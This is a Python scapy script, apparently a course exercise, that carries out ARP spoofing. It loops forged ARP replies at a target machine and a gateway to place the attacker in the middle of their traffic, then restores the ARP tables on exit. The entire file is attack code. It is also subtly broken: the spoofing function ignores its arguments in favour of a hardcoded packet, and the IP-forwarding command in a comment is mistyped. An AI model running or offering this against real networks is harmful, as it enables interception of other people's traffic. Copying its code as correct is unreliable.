import scapy.all as scapy
import time

def get_mac(ip):
    #scapy.arping(ip)
    arp_req = scapy.ARP(pdst = ip)
    #arp_req.pdst=ip,pdst name of the field we need to use and assigning ip value to pdst
    #arp_req.show()#shows a details of the ARP packet(class)
    #arp_req.pdst = ip
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    # (ETHERNET FRAMEWORK) data is sent in network is using MAC address and so the ETHER class and
    # the source and destination MAC is stored in ETHER class #ff:ff:ff:ff:ff:ff virtual MAC but clients receives in network
    #broadcast.show() #shows the details of ETHER packet(class)
    arp_request_broadcast = broadcast/arp_req
    #combining arp_req and broadcast with arp_request_broadcast
    answered_list, unanswered_list = scapy.srp(arp_request_broadcast,timeout=1, verbose=False)
    # sr means send and receive packets that allows custom ether part(arp_request_broadcast) to send and
    # receive but returns more than one values as two list(answered packets and unanswered packets),verbose doesnt print unwanted line
    #print(answered_list.summary())
    return answered_list[0][1].hwsrc

def spoofing(target_ip,spoof_ip):#(victim ip,router ip)
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op = 2,pdst = "10.0.2.3",hwdst ="08:00:27:04:45:b6",psrc = "10.0.2.1")#scapy.ls(scapy.ARP)pdst = "10.0.2.3",hwdst ="08:00:27:04:45:b6",psrc = "10.0.2.1
    #print(packet.show())
    #print(packet.summary())
    scapy.send(packet,verbose=False)#verbose to stop continous send packet output

def restore(destination_ip, source_ip):#destination_ip=target machine ip,source_ip=router ip
    destination_mac= get_mac(destination_ip)
    source_mac=get_mac(source_ip)
    packet = scapy.ARP(op=2,pdst=destination_ip,hwdst=destination_mac,psrc=source_ip,hwsrc=source_mac)
    scapy.send(packet,count=4,verbose=False )
target_ip="10.0.2.7" #targetmachineip
gateway_ip="10.0.2.1" #routerip
try:
    sent_packets_count = 0
    while True:#run continuosly
        spoofing(gateway_ip,target_ip)
        spoofing(target_ip,gateway_ip)
        sent_packets_count = sent_packets_count + 2
        print("\r[+] Packets sent:"+str(sent_packets_count), end="")# end does not add any character at the end of statement,\r prints always from the start of the line
        #sys.stdout.flush() flush the buffer and print the data in buffer in python2
        time.sleep(2)
except KeyboardInterrupt:
    print("[+] detected the Ctrl + C ..... Resetting ARP tables...\n")
    restore(target_ip,gateway_ip)
    restore(gateway_ip,target_ip)
#must enable packet forwarding to flow data to machine(our) to router
#echo 1./proc/sys/net/ipv4/ip_forward